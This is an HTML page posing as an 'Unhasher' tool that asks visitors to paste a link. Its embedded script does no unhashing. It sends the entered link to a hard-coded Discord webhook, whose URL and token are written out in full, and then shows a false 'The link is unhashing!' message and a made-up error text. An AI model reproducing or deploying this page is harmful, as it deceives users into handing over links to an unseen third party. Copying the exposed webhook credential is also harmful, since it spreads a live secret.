<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unhasher HTML</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <script>
        async function sendToWebhook() {
            const linkInput = document.getElementById('link-input').value;
            const webhookUrl = "https://discord.com/api/webhooks/1330613485972750397/tVTgS2qYEai2MZozXqLN_gYsoubs_tSLwhERPhJsWYDsAbCciFcxKckp-DrMPsNFJMH3";

            if (!linkInput) {
                alert('Please enter a link.');
                return;
            }

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `New link: ${linkInput}`
                    })
                });

                if (response.ok) {
                    alert('The link is unhashing!');
                } else {
                    alert('Error.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Unable to find source code. Check the console for details.');
            }
        }
    </script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('https://www.transparenttextures.com/patterns/diagonal-stripes.png'), linear-gradient(135deg, #6E7DFF, #00C9A7);
            background-size: cover;
            background-blend-mode: overlay;
        }
        .container {
            background: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 420px;
            transition: transform 0.3s ease-in-out;
        }
        .container:hover {
            transform: scale(1.03);
        }
        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
            color: #333;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease-in-out;
        }
        input[type="text"]:focus {
            border-color: #4CAF50;
            outline: none;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease-in-out;
        }
        button:hover {
            background-color: #45a049;
        }
        button:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Unhasher</h1>
        <input type="text" id="link-input" placeholder="Enter your link here">
        <button onclick="sendToWebhook()">Send</button>
    </div>
</body>
</html>
